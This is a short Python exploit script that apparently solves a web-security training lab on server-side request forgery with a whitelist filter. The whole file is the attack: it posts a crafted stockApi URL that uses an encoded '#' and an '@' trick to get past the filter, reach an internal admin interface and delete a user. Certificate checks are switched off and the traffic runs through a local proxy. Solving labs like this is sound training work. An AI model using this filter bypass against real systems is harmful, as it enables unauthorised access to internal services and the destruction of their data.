import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http' : 'http://127.0.0.1:8080' , 'https' : 'http://127.0.0.1:8080'}

def delete_user(url):
    # DELETE USER
    stock_url = url + '/product/stock'
    # SYMBOL # ENCODED ONCE BECAUSE THE URLLIB ENCODE IT ONE MORE TIME BY DEFAULT
    params = {
        'stockApi' : 'http://localhost%23@stock.weliketoshop.net/admin/delete?username=carlos'
    }
    print("[+] Exploit {0} sent as value of the 'Stock Check' functionality at url {1}".format(params['stockApi'], stock_url))
    r = requests.post(stock_url, data=params, verify=False, proxies=proxies)
    if "Admin interface only available if logged in as an administrator, or if requested from loopback" in r.text:
        print("[+] User carlos deleted!")
        sys.exit(-1)
    print("[-] Something went wrong!")
    sys.exit(-1)

def main():
    if len(sys.argv) != 2:
        print("[-] USage: %s <url>" % sys.argv[0])
        print("[-] Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1].strip()

    print("[+] Lab: SSRF with whitelist-based input filter")
    print("""[+] This lab has a stock check feature which fetches data from an internal system.
    To solve the lab, change the stock check URL to access the admin interface at http://localhost/admin and delete the user carlos.
The developer has deployed an anti-SSRF defense you will need to bypass.""")

    delete_user(url)


if __name__ == "__main__":
    main()